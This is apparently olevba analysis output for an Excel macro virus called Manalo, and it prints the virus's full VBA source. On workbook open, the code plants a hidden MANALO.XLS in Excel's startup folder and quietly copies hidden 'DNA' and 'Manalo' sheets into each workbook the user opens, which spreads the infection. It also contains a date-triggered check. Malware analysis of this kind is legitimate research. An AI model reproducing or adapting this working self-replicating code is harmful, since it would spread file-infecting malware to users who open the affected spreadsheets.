olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Manalo-44baeedcaec35c9beac256ec28b6be36d64d9ff6
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO DNA.bas 
in file: Virus.MSExcel.Manalo-44baeedcaec35c9beac256ec28b6be36d64d9ff6 - OLE stream: '_VBA_PROJECT_CUR/VBA/DNA'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 














Sub Auto_Open()
Attribute Auto_Open.VB_ProcData.VB_Invoke_Func = " \n14"
        Application.OnSheetActivate = "User"

End Sub

Sub User()
Attribute User.VB_ProcData.VB_Invoke_Func = " \n14"

        
Startup$ = Application.StartupPath
File$ = Dir(Startup$ & "\" & "MANALO.XLS")

If File$ <> "MANALO.XLS" Then GoTo FileDoesNotExist Else GoTo InfectOpenFile

FileDoesNotExist:
            
   Infected$ = ActiveWorkbook.Name
   
   Application.ScreenUpdating = False

   Set newBook = Workbooks.Add
    With newBook
        .Title = ""
        .Subject = ""
    End With
   
   NewWorkbook$ = ActiveWorkbook.Name
   Sheet$ = Workbooks(NewWorkbook$).Sheets(1).Name
        
   If Sheet$ <> "DNA" _
      Then
        Workbooks(Infected$).Sheets("Manalo").Copy Before:=Workbooks(NewWorkbook$).Sheets(1)
        Workbooks(Infected$).Sheets("DNA").Copy Before:=Workbooks(NewWorkbook$).Sheets(1)
        Workbooks(NewWorkbook$).Sheets("DNA").Visible = False
        Workbooks(NewWorkbook$).Sheets("Manalo").Visible = False
      Else
   End If
   ActiveWindow.Visible = False
      
   Workbooks(NewWorkbook$).SaveAs FileName:=Application.StartupPath & "/" & "MANALO.XLS"

GoTo Finish

InfectOpenFile:
        
   FileName$ = ActiveWorkbook.Name
   FirstSheet$ = Workbooks(FileName$).Sheets(1).Name
        
   Application.ScreenUpdating = False
   
   If FirstSheet$ <> "DNA" _
      Then
        Workbooks("MANALO.XLS").Sheets("DNA").Copy Before:=Workbooks(FileName$).Sheets(1)
        Workbooks("MANALO.XLS").Sheets("Manalo").Copy After:=Workbooks(FileName$).Sheets("DNA")
        Workbooks("MANALO.XLS").Sheets("Manalo").Copy Before:=Workbooks(FileName$).Sheets("INC")
        Workbooks(FileName$).Sheets("DNA").Visible = False
        Workbooks(FileName$).Sheets("Manalo").Visible = False
        Workbooks(FileName$).Sheets("INC").Visible = False
      Else
   End If
If Date >= "4/29/99" Then
Workbooks(FileName$).Sheets("INC").Visible = False
End If

Finish:

Application.OnSheetActivate = True
Application.ScreenUpdating = True
Application.OnSheetActivate = "MANALO.XLS!User"
End Sub

-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     11 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  DN
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, hidden -  Manal
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

